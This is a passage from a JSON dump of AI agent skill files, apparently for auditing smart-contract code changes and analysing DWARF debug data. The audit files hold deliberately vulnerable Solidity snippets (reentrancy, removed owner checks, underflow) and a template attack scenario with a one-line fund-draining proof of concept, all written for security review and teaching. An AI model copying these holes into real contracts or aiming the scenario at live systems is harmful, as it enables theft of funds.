MEDIUMHIGH\n- MODIFIED validation + UNCHANGED tests  HIGH RISK\n- Complex logic (>20 lines) + NO tests  HIGH RISK\n\n---\n\n## Phase 3: Blast Radius Analysis\n\n**Calculate impact:**\n```bash\n# Count callers for each modified function\ngrep -r \"functionName(\" --include=\"*.sol\" . | wc -l\n```\n\n**Classify blast radius:**\n- 1-5 calls: LOW\n- 6-20 calls: MEDIUM\n- 21-50 calls: HIGH\n- 50+ calls: CRITICAL\n\n**Priority matrix:**\n\n| Change Risk | Blast Radius | Priority | Analysis Depth |\n|-------------|--------------|----------|----------------|\n| HIGH | CRITICAL | P0 | Deep + all deps |\n| HIGH | HIGH/MEDIUM | P1 | Deep |\n| HIGH | LOW | P2 | Standard |\n| MEDIUM | CRITICAL/HIGH | P1 | Standard + callers |\n\n---\n\n## Phase 4: Deep Context Analysis\n\n**If `audit-context-building` skill is available**, invoke it to help answer all the questions below for each HIGH RISK changed function:\n\n```bash\n# Run audit-context-building on the changed function and its dependencies\naudit-context-building --scope [file containing changed function] --focus flow-analysis,call-graphs,invariants,root-cause\n```\n\n**The audit-context-building skill will help you answer:**\n\n1. **Map complete function flow:**\n   - Entry conditions (preconditions, requires, modifiers)\n   - State reads (which variables accessed)\n   - State writes (which variables modified)\n   - External calls (to contracts, APIs, system)\n   - Return values and side effects\n\n2. **Trace internal calls:**\n   - List all functions called\n   - Recursively map their flows\n   - Build complete call graph\n\n3. **Trace external calls:**\n   - Identify trust boundaries crossed\n   - List assumptions about external behavior\n   - Check for reentrancy risks\n\n4. **Identify invariants:**\n   - What must ALWAYS be true?\n   - What must NEVER happen?\n   - Are invariants maintained after changes?\n\n5. **Five Whys root cause:**\n   - WHY was this code changed?\n   - WHY did the original code exist?\n   - WHY might this break?\n   - WHY is this approach chosen?\n   - WHY could this fail in production?\n\n**If `audit-context-building` skill is NOT available**, manually perform the line-by-line analysis above using Read, Grep, and code tracing.\n\n**Cross-cutting pattern detection:**\n```bash\n# Find repeated validation patterns\ngrep -r \"require.*amount > 0\" --include=\"*.sol\" .\ngrep -r \"onlyOwner\" --include=\"*.sol\" .\n\n# Check if any removed in diff\ngit diff <range> | grep \"^-.*require.*amount > 0\"\n```\n\n**Flag if removal breaks defense-in-depth.**\n\n---\n\n**Next steps:**\n- For HIGH RISK changes, proceed to [adversarial.md](adversarial.md)\n- For report generation, see [reporting.md](reporting.md)\n",
        "plugins/differential-review/skills/differential-review/patterns.md": "# Common Vulnerability Patterns\n\nQuick reference for detecting common security issues in code changes.\n\n**Specialized Pattern Resources:**\nFor specific contexts, reference these additional pattern databases:\n\n**Domain-Specific:**\n- `domain-specific-audits/defi-bridges/resources/` - 127 bridge-specific findings\n- `domain-specific-audits/tick-math/resources/` - 81 tick math findings\n- `domain-specific-audits/merkle-trees/resources/` - 67 merkle tree findings\n- [Check `domain-specific-audits/skills/` for additional domains]\n\n**Solidity-Specific:**\n- `not-so-smart-contracts` - Automated Solidity vulnerability detectors\n- `token-integration-analyzer` - Token integration safety patterns\n- `building-secure-contracts/development-guidelines` - Solidity best practices\n\nThese complement the generic patterns below.\n\n---\n\n## Security Regressions\n\n**Pattern:** Previously removed code is re-added\n\n**Detection:**\n```bash\n# Code previously removed for security\ngit log -S \"pattern\" --all --grep=\"security\\|fix\\|CVE\"\n```\n\n**Red flags:**\n- Commit message contains \"security\", \"fix\", \"CVE\", \"vulnerability\"\n- Code removed <6 months ago\n- No explanation in current PR for re-addition\n\n**Example:**\n```solidity\n// Removed in commit abc123 \"Fix reentrancy CVE-2024-1234\"\n// Re-added in current PR\nfunction emergencyWithdraw() {\n    // REGRESSION: Reentrancy vulnerability re-introduced\n}\n```\n\n---\n\n## Double Decrease/Increase Bugs\n\n**Pattern:** Same accounting operation twice for same event\n\n**Detection:** Look for two state updates in related functions for same logical action\n\n**Example:**\n```solidity\n// Request exit\nfunction requestExit() {\n    balance[user] -= amount;  // First decrease\n}\n\n// Process exit\nfunction processExit() {\n    balance[user] -= amount;  // Second decrease - BUG!\n}\n```\n\n**Impact:** User balance decremented twice, protocol loses funds\n\n---\n\n## Missing Validation\n\n**Pattern:** Removed `require`/`assert`/`check` without replacement\n\n**Detection:**\n```bash\ngit diff <range> | grep \"^-.*require\"\ngit diff <range> | grep \"^-.*assert\"\ngit diff <range> | grep \"^-.*revert\"\n```\n\n**Questions to ask:**\n- Was validation moved elsewhere?\n- Is it redundant (defensive programming)?\n- Does removal expose vulnerability?\n\n**Example:**\n```diff\nfunction withdraw(uint256 amount) {\n-   require(amount > 0, \"Zero amount\");\n-   require(amount <= balance[msg.sender], \"Insufficient\");\n    balance[msg.sender] -= amount;\n}\n```\n\n**Risk:** Zero-amount withdrawals, underflow attacks now possible\n\n---\n\n## Underflow/Overflow\n\n**Pattern:** Arithmetic without SafeMath or checks\n\n**Detection:**\n- Look for `+`, `-`, `*`, `/` in Solidity <0.8.0\n- Check if SafeMath removed\n- Look for unchecked blocks in Solidity >=0.8.0\n\n**Example:**\n```solidity\n// Solidity 0.7 without SafeMath\nbalance[user] -= amount;  // Can underflow if amount > balance\n\n// Solidity 0.8+ with unchecked\nunchecked {\n    balance[user] -= amount;  // Deliberately bypasses overflow check\n}\n```\n\n**Risk:** Integer wrap-around leads to incorrect balances\n\n---\n\n## Reentrancy\n\n**Pattern:** External call before state update\n\n**Detection:** Look for CEI (Checks-Effects-Interactions) pattern violations\n\n**Example:**\n```solidity\n// VULNERABLE: External call before state update\nfunction withdraw() {\n    uint amount = balances[msg.sender];\n    (bool success,) = msg.sender.call{value: amount}(\"\");  // External call FIRST\n    require(success);\n    balances[msg.sender] = 0;  // State update AFTER\n}\n\n// SAFE: State update before external call\nfunction withdraw() {\n    uint amount = balances[msg.sender];\n    balances[msg.sender] = 0;  // State update FIRST\n    (bool success,) = msg.sender.call{value: amount}(\"\");  // External call AFTER\n    require(success);\n}\n```\n\n**Impact:** Attacker can recursively call withdraw() before balance is zeroed\n\n---\n\n## Access Control Bypass\n\n**Pattern:** Removed or relaxed permission checks\n\n**Detection:**\n```bash\ngit diff <range> | grep \"^-.*onlyOwner\"\ngit diff <range> | grep \"^-.*onlyAdmin\"\ngit diff <range> | grep \"^-.*require.*msg.sender\"\n```\n\n**Questions:**\n- Who can now call this function?\n- What's the new trust model?\n- Was check moved to caller?\n\n**Example:**\n```diff\n- function setConfig(uint value) external onlyOwner {\n+ function setConfig(uint value) external {\n      config = value;\n  }\n```\n\n**Risk:** Any user can now modify critical configuration\n\n---\n\n## Race Conditions / Front-Running\n\n**Pattern:** State-dependent logic without protection\n\n**Detection:** Look for two-step processes without commit-reveal or timelocks\n\n**Example:**\n```solidity\n// Step 1: Approve\nfunction approve(address spender, uint amount) {\n    allowance[msg.sender][spender] = amount;\n}\n\n// Step 2: User can front-run between approval changes\n// Attacker sees tx changing approval from 100 to 50\n// Front-runs to spend 100, then spends 50 after = 150 total\n```\n\n**Risk:** MEV/front-running exploits state transitions\n\n---\n\n## Timestamp Manipulation\n\n**Pattern:** Security logic depending on `block.timestamp`\n\n**Detection:**\n```bash\ngrep -r \"block.timestamp\" --include=\"*.sol\"\ngrep -r \"now\\b\" --include=\"*.sol\"  # Solidity <0.7\n```\n\n**Example:**\n```solidity\n// VULNERABLE\nrequire(block.timestamp > deadline, \"Too early\");\n// Miner can manipulate timestamp by ~15 seconds\n\n// SAFER\nrequire(block.number > deadlineBlock, \"Too early\");\n// Block numbers are harder to manipulate\n```\n\n**Risk:** Miners can manipulate timestamps within tolerance\n\n---\n\n## Unchecked Return Values\n\n**Pattern:** External call without checking success\n\n**Detection:**\n```bash\ngit diff <range> | grep \"\\.call\\|\\.send\\|\\.transfer\"\n```\n\n**Example:**\n```solidity\n// VULNERABLE\ntoken.transfer(user, amount);  // Ignores return value\n\n// SAFE\nrequire(token.transfer(user, amount), \"Transfer failed\");\n// Or use SafeERC20 wrapper\n```\n\n**Risk:** Silent failures lead to inconsistent state\n\n---\n\n## Denial of Service\n\n**Pattern:** Unbounded loops, external call reverts blocking execution\n\n**Detection:**\n- Arrays that grow without limit\n- Loops over user-controlled array\n- Critical function depends on external call success\n\n**Example:**\n```solidity\n// DOS: Attacker adds many users, making loop too expensive\nfunction distributeRewards() {\n    for (uint i = 0; i < users.length; i++) {\n        users[i].transfer(reward);  // Runs out of gas\n    }\n}\n```\n\n**Risk:** Function becomes unusable due to gas limits\n\n---\n\n## Quick Detection Commands\n\n**Find removed security checks:**\n```bash\ngit diff <range> | grep \"^-\" | grep -E \"require|assert|revert\"\n```\n\n**Find new external calls:**\n```bash\ngit diff <range> | grep \"^+\" | grep -E \"\\.call|\\.delegatecall|\\.staticcall\"\n```\n\n**Find changed access modifiers:**\n```bash\ngit diff <range> | grep -E \"onlyOwner|onlyAdmin|internal|private|public|external\"\n```\n\n**Find arithmetic changes:**\n```bash\ngit diff <range> | grep -E \"\\+|\\-|\\*|/\"\n```\n\n---\n\n**For detailed analysis workflow, see [methodology.md](methodology.md)**\n**For building exploit scenarios, see [adversarial.md](adversarial.md)**\n",
        "plugins/differential-review/skills/differential-review/reporting.md": "# Report Generation (Phase 6)\n\nComprehensive markdown report structure and formatting guidelines.\n\n---\n\n## Report Structure\n\nGenerate markdown report with these mandatory sections:\n\n### 1. Executive Summary\n\n- Severity distribution table\n- Risk assessment (CRITICAL/HIGH/MEDIUM/LOW)\n- Final recommendation (APPROVE/REJECT/CONDITIONAL)\n- Key metrics (test gaps, blast radius, red flags)\n\n**Template:**\n```markdown\n# Executive Summary\n\n| Severity | Count |\n|----------|-------|\n|  CRITICAL | X |\n|  HIGH | Y |\n|  MEDIUM | Z |\n|  LOW | W |\n\n**Overall Risk:** CRITICAL/HIGH/MEDIUM/LOW\n**Recommendation:** APPROVE/REJECT/CONDITIONAL\n\n**Key Metrics:**\n- Files analyzed: X/Y (Z%)\n- Test coverage gaps: N functions\n- High blast radius changes: M functions\n- Security regressions detected: P\n```\n\n---\n\n### 2. What Changed\n\n- Commit timeline with visual\n- File summary table\n- Lines changed stats\n\n**Template:**\n```markdown\n## What Changed\n\n**Commit Range:** `base..head`\n**Commits:** X\n**Timeline:** YYYY-MM-DD to YYYY-MM-DD\n\n| File | +Lines | -Lines | Risk | Blast Radius |\n|------|--------|--------|------|--------------|\n| file1.sol | +50 | -20 | HIGH | CRITICAL |\n| file2.sol | +10 | -5 | MEDIUM | LOW |\n\n**Total:** +N, -M lines across K files\n```\n\n---\n\n### 3. Critical Findings\n\nFor each HIGH/CRITICAL issue:\n\n```markdown\n### [SEVERITY] Title\n\n**File**: path/to/file.ext:lineNumber\n**Commit**: hash\n**Blast Radius**: N callers (HIGH/MEDIUM/LOW)\n**Test Coverage**: YES/NO/PARTIAL\n\n**Description**: [clear explanation]\n\n**Historical Context**:\n- Git blame: Added in commit X (date)\n- Message: \"[original commit message]\"\n- [Why this code existed]\n\n**Attack Scenario**:\n[Concrete exploitation steps from adversarial.md]\n\n**Proof of Concept**:\n```code demonstrating issue```\n\n**Recommendation**:\n[Specific fix with code]\n```\n\n**Example:**\n```markdown\n###  CRITICAL: Authorization Bypass in Withdraw\n\n**File**: TokenVault.sol:156\n**Commit**: abc123def\n**Blast Radius**: 23 callers (HIGH)\n**Test Coverage**: NO\n\n**Description**:\nRemoved `require(msg.sender == owner)` check allows any user to withdraw funds.\n\n**Historical Context**:\n- Git blame: Added 2024-06-15 (commit def456)\n- Message: \"Add owner check per audit finding #45\"\n- Code existed to prevent unauthorized withdrawals\n\n**Attack Scenario**:\n1. Attacker calls `withdraw(1000 ether)`\n2. No authorization check (removed)\n3. 1000 ETH transferred to attacker\n4. Protocol funds drained\n\n**Proof of Concept**:\n```solidity\n// As any address\nvault.withdraw(vault.balance());\n// Success - funds stolen\n```\n\n**Recommendation**:\n```solidity\nfunction withdraw(uint256 amount) external {\n+   require(msg.sender == owner, \"Unauthorized\");\n    // ... rest of function\n}\n```\n```\n\n---\n\n### 4. Test Coverage Analysis\n\n- Coverage statistics\n- Untested changes list\n- Risk assessment\n\n**Template:**\n```markdown\n## Test Coverage Analysis\n\n**Coverage:** X% of changed code\n\n**Untested Changes:**\n| Function | Risk | Impact |\n|----------|------|--------|\n| functionA() | HIGH | No validation tests |\n| functionB() | MEDIUM | Logic untested |\n\n**Risk Assessment:**\nN HIGH-risk functions without tests  Recommend blocking merge\n```\n\n---\n\n### 5. Blast Radius Analysis\n\n- High-impact functions table\n- Dependency graph\n- Impact quantification\n\n**Template:**\n```markdown\n## Blast Radius Analysis\n\n**High-Impact Changes:**\n| Function | Callers | Risk | Priority |\n|----------|---------|------|----------|\n| transfer() | 89 | HIGH | P0 |\n| validate() | 45 | MEDIUM | P1 |\n```\n\n---\n\n### 6. Historical Context\n\n- Security-related removals\n- Regression risks\n- Commit message red flags\n\n**Template:**\n```markdown\n## Historical Context\n\n**Security-Related Removals:**\n- Line 45: `require` removed (added 2024-03 for CVE-2024-1234)\n- Line 78: Validation removed (added 2023-12 \"security hardening\")\n\n**Regression Risks:**\n- Code pattern removed in commit X, re-added in commit Y\n```\n\n---\n\n### 7. Recommendations\n\n- Immediate actions (blocking)\n- Before production (tracking)\n- Technical debt (future)\n\n**Template:**\n```markdown\n## Recommendations\n\n### Immediate (Blocking)\n- [ ] Fix CRITICAL issue in TokenVault.sol:156\n- [ ] Add tests for withdraw() function\n\n### Before Production\n- [ ] Security audit of auth changes\n- [ ] Load test blast radius functions\n\n### Technical Debt\n- [ ] Refactor validation pattern consistency\n```\n\n---\n\n### 8. Analysis Methodology\n\n- Strategy used (DEEP/FOCUSED/SURGICAL)\n- Files analyzed\n- Coverage estimate\n- Techniques applied\n- Limitations\n- Confidence level\n\n**Template:**\n```markdown\n## Analysis Methodology\n\n**Strategy:** FOCUSED (80 files, medium codebase)\n\n**Analysis Scope:**\n- Files reviewed: 45/80 (56%)\n- HIGH RISK: 100% coverage\n- MEDIUM RISK: 60% coverage\n- LOW RISK: Excluded\n\n**Techniques:**\n- Git blame on all removals\n- Blast radius calculation\n- Test coverage analysis\n- Adversarial modeling for HIGH RISK\n\n**Limitations:**\n- Did not analyze external dependencies\n- Limited to 1-hop caller analysis\n\n**Confidence:** HIGH for analyzed scope, MEDIUM overall\n```\n\n---\n\n### 9. Appendices\n\n- Commit reference table\n- Key definitions\n- Contact info\n\n---\n\n## Formatting Guidelines\n\n**Tables:** Use markdown tables for structured data\n\n**Code blocks:** Always include syntax highlighting\n```solidity\n// Solidity code\n```\n```rust\n// Rust code\n```\n\n**Status indicators:**\n-  Complete\n-  Warning\n-  Failed/Blocked\n\n**Severity:**\n-  CRITICAL\n-  HIGH\n-  MEDIUM\n-  LOW\n\n**Before/After comparisons:**\n```markdown\n**BEFORE:**\n```code\nold code\n```\n\n**AFTER:**\n```code\nnew code\n```\n```\n\n**Line number references:** Always include\n- Format: `file.sol:L123`\n- Link to commit: `file.sol:L123 (commit abc123)`\n\n---\n\n## File Naming and Location\n\n**Priority order for output:**\n1. Current working directory (if project repo)\n2. User's Desktop\n3. `~/.claude/skills/differential-review/output/`\n\n**Filename format:**\n```\n<PROJECT>_DIFFERENTIAL_REVIEW_<DATE>.md\n\nExample: VeChain_Stargate_DIFFERENTIAL_REVIEW_2025-12-26.md\n```\n\n---\n\n## User Notification Template\n\nAfter generating report:\n\n```markdown\nReport generated successfully!\n\n File: [filename]\n Location: [path]\n Size: XX KB\n Review Time: ~X hours\n\nSummary:\n- X findings (Y critical, Z high)\n- Final recommendation: APPROVE/REJECT/CONDITIONAL\n- Confidence: HIGH/MEDIUM/LOW\n\nNext steps:\n- Review findings in detail\n- Address CRITICAL/HIGH issues before merge\n- Consider chaining with issue-writer for stakeholder report\n```\n\n---\n\n## Integration with issue-writer\n\nAfter generating differential review, transform into audit report:\n\n```bash\nissue-writer --input DIFFERENTIAL_REVIEW_REPORT.md --format audit-report\n```\n\nThis creates polished documentation for non-technical stakeholders.\n\n---\n\n## Error Handling\n\nIf file write fails:\n1. Try Desktop location\n2. Try temp directory\n3. As last resort, output full report to chat\n4. Notify user to save manually\n\n**Always prioritize persistent artifact generation over ephemeral chat output.**\n",
        "plugins/dwarf-expert/.claude-plugin/plugin.json": "{\n  \"name\": \"dwarf-expert\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Interact with and understand the DWARF debugging format\",\n  \"author\": {\n    \"name\": \"Evan Hellman\",\n    \"email\": \"opensource@trailofbits.com\",\n    \"url\": \"https://github.com/trailofbits\"\n  }\n}\n",
        "plugins/dwarf-expert/README.md": "# DWARF Expert\n\nInteract with and analyze DWARF debug files, understand the DWARF debug format/standard, and write code that parses DWARF data.\n\n**Author:** Evan Hellman\n\n## When to Use\n\nUse this skill when you need to:\n- Understand or parse DWARF debug information from compiled binaries\n- Answer questions about the DWARF standard (v3, v4, v5)\n- Write or review code that interacts with DWARF data\n- Use `dwarfdump` or `readelf` to extract debug information\n- Verify DWARF data integrity using `llvm-dwarfdump --verify`\n- Work with DWARF parsing libraries (libdwarf, pyelftools, gimli, etc.)\n\n## What It Does\n\nThis skill provides expertise on:\n- DWARF standards (v3-v5) via web search and authoritative source references\n- Parsing DWARF files using `dwarfdump` and `readelf` commands\n- Verification workflows using `llvm-dwarfdump --verify` and `--statistics`\n- Library recommendations for DWARF parsing in C/C++, Python, Rust, Go, and .NET\n- DIE (Debug Information Entry) analysis and searching\n- Understanding DWARF sections, attributes, and forms\n\n## Authoritative Sources\n\nThis skill uses the following authoritative sources for DWARF standard information:\n- **dwarfstd.org**: Official DWARF specification (via web search)\n- **LLVM source**: `llvm/lib/DebugInfo/DWARF/` for reference implementations\n- **libdwarf source**: github.com/davea42/libdwarf-code for C implementations\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/dwarf-expert\n```\n",
        "plugins/dwarf-expert/skills/dwarf-expert/SKILL.md": "---\nname: dwarf-expert\ndescription: Provides expertise for analyzing DWARF debug files and understanding the DWARF debug format/standard (v3-v5). Triggers when understanding DWARF information, interacting with DWARF files, answering DWARF-related questions, or working with code that parses DWARF data.\nallowed-tools:\n  - Read\n  - Bash\n  - Grep\n  - Glob\n  - WebSearch\n---\n# Overview\nThis skill provides technical knowledge and expertise about the DWARF standard and how to interact with DWARF files. Tasks include answering questions about the DWARF standard, providing examples of various DWARF features, parsing and/or creating DWARF files, and writing/modifying/analyzing code that interacts with DWARF data.\n\n## When to Use This Skill\n- Understanding or parsing DWARF debug information from compiled binaries\n- Answering questions about the DWARF standard (v3, v4, v5)\n- Writing or reviewing code that interacts with DWARF data\n- Using `dwarfdump` or `readelf` to extract debug information\n- Verifying DWARF data integrity with `llvm-dwarfdump --verify`\n- Working with DWARF parsing libraries (libdwarf, pyelftools, gimli, etc.)\n\n## When NOT to Use This Skill\n- **DWARF v1/v2 Analysis**: Expertise limited to versions 3, 4, and 5.\n- **General ELF Parsing**: Use standard ELF tools if DWARF data isn't needed.\n- **Executable Debugging**: Use dedicated debugging tools (gdb, lldb, etc) for debugging executable code/runtime behavior.\n- **Binary Reverse Engineering**: Use dedicated RE tools (Ghidra, IDA) unless specifically analyzing DWARF sections.\n- **Compiler Debugging**: DWARF generation issues are compiler-specific, not covered here.\n\n# Authoritative Sources\nWhen specific DWARF standard information is needed, use these authoritative sources:\n\n1. **Official DWARF Standards (dwarfstd.org)**: Use web search to find specific sections of the official DWARF specification at dwarfstd.org. Search queries like \"DWARF5 DW_TAG_subprogram attributes site:dwarfstd.org\" are effective.\n\n2. **LLVM DWARF Implementation**: The LLVM project's DWARF handling code at `llvm/lib/DebugInfo/DWARF/` serves as a reliable reference implementation. Key files include:\n   - `DWARFDie.cpp` - DIE handling and attribute access\n   - `DWARFUnit.cpp` - Compilation unit parsing\n   - `DWARFDebugLine.cpp` - Line number information\n   - `DWARFVerifier.cpp` - Validation logic\n\n3. **libdwarf**: The reference C implementation at github.com/davea42/libdwarf-code provides detailed handling of DWARF data structures.\n\n# Verification Workflows\nUse `llvm-dwarfdump` verification options to validate DWARF data integrity:\n\n## Structural Validation\n```bash\n# Verify DWARF structure (compile units, DIE relationships, address ranges)\nllvm-dwarfdump --verify <binary>\n\n# Detailed error output with summary\nllvm-dwarfdump --verify --error-display=full <binary>\n\n# Machine-readable JSON error summary\nllvm-dwarfdump --verify --verify-json=errors.json <binary>\n```\n\n## Quality Metrics\n```bash\n# Output debug info quality metrics as JSON\nllvm-dwarfdump --statistics <binary>\n```\n\nThe `--statistics` output helps compare debug info quality across compiler versions and optimization levels.\n\n## Common Verification Patterns\n- **After compilation**: Verify binaries have valid DWARF before distribution\n- **Comparing builds**: Use `--statistics` to detect debug info quality regressions\n- **Debugging debuggers**: Identify malformed DWARF causing debugger issues\n- **DWARF tool development**: Validate parser output against known-good binaries\n\n# Parsing DWARF Debug Information\n## readelf\nELF files can be parsed via the `readelf` command ({baseDir}/reference/readelf.md). Use this for general ELF information, but prefer `dwarfdump` for DWARF-specific parsing.\n\n## dwarfdump\nDWARF files can be parsed via the `dwarfdump` command, which is more effective at parsing and displaying complex DWARF information than `readelf` and should be used for most DWARF parsing tasks ({baseDir}/reference/dwarfdump.md).\n\n# Working With Code\nThis skill supports writing, modifying, and reviewing code that interacts with DWARF data. This may involve code that parses DWARF debug data from scratch or code that leverages libraries to parse and interact with DWARF data ({baseDir}/reference/coding.md).\n\n# Choosing Your Approach\n```\n Need to verify DWARF data integrity?\n    Use `llvm-dwarfdump --verify` (see Verification Workflows above)\n Need to answer questions about the DWARF standard?\n    Search dwarfstd.org or reference LLVM/libdwarf source\n Need simple section dump or general ELF info?\n    Use `readelf` ({baseDir}/reference/readelf.md)\n Need to parse, search, and/or dump DWARF DIE nodes?\n    Use `dwarfdump` ({baseDir}/reference/dwarfdump.md)\n Need to write, modify, or review code that interacts with DWARF data?\n     Refer to the coding reference ({baseDir}/reference/coding.md)\n```\n",
        "plugins/dwarf-expert/skills/dwarf-expert/reference/coding.md": "# Writing, Modifying, or Reviewing Code That Interacts With DWARF Data.\nYou may be tasked with writing, modifying, or reviewing code that handles, parses, or otherwise interacts with DWARF data. \n\n## General Guidelines\n- **Rely on Authoritative Sources**: For ground-truth information about DWARF sections, DIE nodes, and attributes, use web search for dwarfstd.org specifications or reference LLVM/libdwarf source code implementations.\n- **Using DWARF Expertise**: Use your DWARF-specific expertise to work with code that interacts with DWARF data, but do NOT use it when working with unrelated code.\n\n## Writing Code\n- **Prefer Python for Scripting**: Prefer to use Python for simpler DWARF code (such as scripts that filter for specific DIE nodes) unless another language is specified.\n- **Leverage Existing Libraries**: Prefer to use existing libraries to parse/handle DWARF data if they exist for the selected language (see `Common DWARF Libraries`).\n- **Refer to Library Documentation**: If using a library, refer to it's documentation as needed (both in-code and online references if available).\n\n## Modifying Code\n- **Follow Existing Styles**: Adhere to existing code styles, formatting, naming conventions, etc wherever possible.\n- **Group Changes**: Perform logically related changes together and separate out unrelated groups of changes into individual steps.\n- **Describe Changes**: Clearly describe the purpose of each group of changes and what each individual change achieves to the user.\n- **Advise on Complex Changes**: Suggest especially large or complex changes to the user before making them. For example, if a significant amount of code needs to be added or modified to handle a particular type of DIE node or attribute.\n\n## Reviewing Code\n- **Only Suggest Changes**: Suggest changes or advise on refactors but do NOT modify the code.\n- **Consider Edge Cases**: Consider edge cases that may be unhandled, such as special DIE node types, abstract base DIE nodes, specification DIE nodes, optional attributes, etc.\n\n# Common DWARF Libraries\nThere are a number of libraries that can be leveraged to parse and interact with DWARF data. Prefer to use these when writing new code (if the chosen language has a compatible library).\n| Library | Language | URL | Notes |\n|---------|----------|-----|-------|\n| `libdwarf` | C/C++ | https://github.com/davea42/libdwarf-code | Offers a simpler, lower-level interface. Used to implement `dwarfdump`. |\n| `pyelftools` | Python | https://github.com/eliben/pyelftools | Also supports parsing of ELF files in general. |\n| `gimli` | Rust | https://github.com/gimli-rs/gimli | Designed for performant access to DWARF data. May require other dependencies (such as `object`) to open and parse entire DWARF files. |\n| `debug/dwarf` | Go | https://github.com/golang/go/tree/master/src/debug/dwarf | Standard library built-in. |\n| `LibObjectFile` | .NET | https://github.com/xoofx/LibObjectFile | Also supports interfacing with object files (ELF, PE/COFF, etc) in general. |",
        "plugins/dwarf-expert/skills/dwarf-expert/reference/dwarfdump.md": "# Parsing DWARF Files With dwarfdump\n`dwarfdump` is a utility used to parse and dump DWARF information from DWARF files. It can be used to dump individual DWARF sections, display DIE node trees (both parents and children), search for DIE nodes by name or address, and verify that DWARF files are well-formed.\n\n## dwarfdump vs llvm-dwarfdump\nTwo slightly different flavors of the `dwarfdump` utility exist:\n- libdwarf's implementation, typically called `dwarfdump`\n- LLVM's implementation, typically called `llvm-dwarfdump`\n\nBoth can be used interchangeably, albeit with slightly different command-line options. Both accept options to modify the dumped output and the path to the object file containing the DWARF information to dump. The actual `dwarfdump` command my refer to either of the utilities depending on the system; Use `dwarfdump --version` to determine which implementation is used.\n\n## Commonly Used Options for LLVM dwarfdump\nThese options are specific to LLVM's implementation of `dwarfdump`.\n- `dwarfdump --version`: Display version information. Use to determine whether the system uses libdwarf's or LLVM's implementation.\n- `dwarfdump --help`: Display available options.\n- `dwarfdump --all`: Dump all DWARF sections.\n- `dwarfdump --<debug_section>`: Dump a particular DWARF section (e.g. `--debug-addr`, `--debug-names`, etc). Can be specified multiple times to dump multiple sections.\n- `dwarfdump --show-children [--recurse-depth=<n>]`: Show a debug info entry's children when selectively printing entries. Optionally, provide `--recurse-depth` to limit the depth of children to diplay. Use in cases where information about parent DIE nodes is especially relevant or requested. Commonly used when displaying DIE nodes for functions and data types as child DIE nodes contain info about parameters, local variables, structure members, etc.\n- `dwarfdump --show-parents [--parent-recurse-depth=<n>]`: Show a debug info entry's parents when selectively printing entries. Optionally provide `--parent-recurse-depth` to limit the depth of parents to display. Use in cases where information about parent DIE nodes is especially relevant or requested.\n- `dwarfdump --show-form`: Show DWARF form types after the DWARF attribute types. Use to display more verbose DWARF information about the type of DWARF attributes.\n- `dwarfdump --find=<pattern>`: Search for an exact match of the given name in the accelerator tables. This will not perform an exhaustive search over all DIE node. Use as an initial lookup for DIE nodes with specific names, but fall back to using `--name <pattern>` to perform an exhaustive search if `find` does not find any DIE nodes with the given name.\n- `dwarfdump --name <pattern> [--ignore-case] [--regex]`: Search for any DIE nodes whose name matches the given pattern. Optionally use `--ignore-case` to perform a case-insensitive search and/or `--regex` to interpret the pattern as a regex for more complex searches. Performs an exhaustive search over all DIE nodes. Use to perform exhaustive lookup for exact name matches where `--find=<pattern>` fails or to search for more complex name via regex.\n- `dwarfdump --lookup=<address>`: Find the DIE node at a specific address. Use to search for specific DIE nodes when their address is known, such as when gathering information about a DIE node referenced by some previously dumped DIE node.\n- `dwarfdump --verify`: Verify a DWARF file. Use to check whether a DWARF file is well-formed.\n- `dwarfdump --verbose`: Print more low-level encoding details. Use in cases where extra information is helpful for debugging.\n\n## Verification Options (llvm-dwarfdump)\nThese options are useful for validating DWARF data integrity:\n- `llvm-dwarfdump --verify <binary>`: Verify DWARF structure including compile unit chains, DIE relationships, and address ranges.\n- `llvm-dwarfdump --verify --error-display=<mode>`: Control verification output detail. Modes: `quiet` (errors only), `summary`, `details`, `full` (errors with summary).\n- `llvm-dwarfdump --verify --verify-json=<path>`: Output JSON-formatted error summary to file. Useful for CI integration.\n- `llvm-dwarfdump --statistics <binary>`: Output debug info quality metrics as single-line JSON. Useful for comparing builds.\n- `llvm-dwarfdump --verify --quiet`: Run verification without output to stdout (exit code indicates success/failure).\n\n## Searching DIE Nodes\nIn many cases it is necessary to search for specific DIE nodes (and their children and/or parents).\n\n### Simple Search\nFor simple cases such as name matches or exact address matches, prefer using `dwarfdump` with `--lookup`, `--find`, or `--name`.\n\n### Complex Search\nIn more complex cases cases, it may be necessary to perform custom searching over the output. For example, finding all DWARF parameter DIE nodes that have a particular type necessitates manually searching the `dwarfdump` output. In cases such a these, follow these steps:\n| Step | Description | Example |\n|------|-------------|---------|\n| Initial Filtering | Dump the entire DWARF file and use filtering tools, such as `grep`, to perform more complex filtering of the data. | `dwarfdump <file> \\| grep \"float \\*\"` to search for the `float *` type. |\n| Get DIE Address |  Get the address of any DIE node that match the search. This may require refinining the previous command to print more than just the matching line, such as using the `grep -B <n>` option to print `n` lines before the matching one to get the line with the address. | `dwarfdump <file> \\| grep -B 5 \"float \\*\"` to print 5 preceding lines for each match. This will print the line with the DIE node type and address. |\n| Refine Filtering | Additional filtering may be required to narrow the search to DIE nodes of the desired type. In this case, additional filtering tools can be used to narrow the search further. | `dwarfdump <file> \\| grep -B 5 \"float \\*\" \\| grep \"DW_TAG_formal_parameter` to search only for parameter DIE nodes. |\n| Print Complete DWARF Info | Use `dwarfdump --lookup=<address>` (potentially with `--show-children` and/or `--show-parents`) for each matching DIE node's address to print information about them in a uniform format. |\n\n### Scripted Search\nSometimes, searching with filtering tools is too complex or produces inconsistent or incomplete results. In highly complex cases, such as searching for DIE nodes with multiple exact attribute values. In these cases, it is easiest to write a Python script leveraging the `pyelftools` package to parse and search DWARF files. Resort to this only if the filtering approach fails or becomes to complex.",
        "plugins/dwarf-expert/skills/dwarf-expert/reference/readelf.md": "# Parsing ELF Files With readelf\n`readelf` is a utility used to parse and dump ELF information from ELF files. It can be used to dump various ELF sections including DWARF sections.\n\n## Commonly Used Options\n- `readelf --help`: Display available options.\n- `readelf --debug-dump [debug_section]`: Dump a particular DWARF section (e.g. `addr`, `pubnames`, etc). Can be specified multiple times to dump multiple sections.\n- `readelf --dwarf-depth=N`: Do not display DIEs at depth N or greater.\n- `readelf --dwarf-start=N`: Display DIE nodes starting at offset N.",
